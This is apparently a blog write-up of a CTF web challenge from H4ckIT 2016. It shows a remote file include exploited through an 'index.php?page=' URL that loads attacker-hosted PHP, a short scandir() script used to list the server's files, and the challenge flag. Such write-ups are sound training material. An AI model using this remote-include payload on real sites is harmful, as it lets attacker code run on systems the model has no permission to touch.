---
layout: post
title: H4ckIT CTF 2016 - Remote Pentest (Web 150)
date: 2016-10-03 12:03:00
categories: 
- CTF 
- H4ckIT 2016
---

## Challenge

> Our foreign partners have some problems with qualified staff in the field of information technology, we decided to help them and to conduct remote testing of their new website. Your task is to find a hole in the system and grab some information to confirm the hack. Good luck! <br>
> http://91.231.84.36:9150/


## Solution

I liked this challenge.  I think it was well made.  It was easy to find the right direction, but it took a little bit of consideration to find the answer.  I'm not even convinced my solution was the most straightforward, but it certainly worked.

After poking around the site HTML for a few minutes, I found a possible file include vulnerability and attempted to exploit it as a remote file include by navigating to the page `/index.php?page=http://google.com%00`.  Google's homepage did in fact load into the site, confirming a remote file include vulnerability.  I could exploit this by hosting a malicious PHP file and accessing it by visiting `/index.php?page=http://mysite.com/phpscript.txt%00`.

My first thought was to use a PHP web shell, but it seemed like the PHP `system()` function was disabled.

At this point I wanted to see if any PHP functions were working, so I tried running `phpinfo()`.  That was a fortuitous plan not only because it worked, but because it then pointed me in the right direction.  The server's document root was configured to __/var/www/srv/www__, which I then thought to scan for other documents, especially something like __flag.txt__.  I used the PHP `scandir()` function, which returned the following array:

```php
Array ( 
	[0] => . 
	[1] => .. 
	[2] => .htaccess 
	[3] => .htaccess_kab 
	[4] => about.php 
	[5] => contact.php 
	[6] => css 
	[7] => fonts 
	[8] => index.php 
	[9] => js 
	[10] => php.ini 
	[11] => services.php 
	[12] => sup3r_$3cr3t_f1le.php 
)
```

Found it.  Navigating to the subtly named __sup3r_$3cr3t_f1le.php__ prints the flag.

## Script (PHP)

```php
<?php
$dir = scandir('/var/www/srv/www');
print_r($dir);
?>
```

## Flag

```none
h4ck1t{g00d_rfi_its_y0ur_fl@g}
```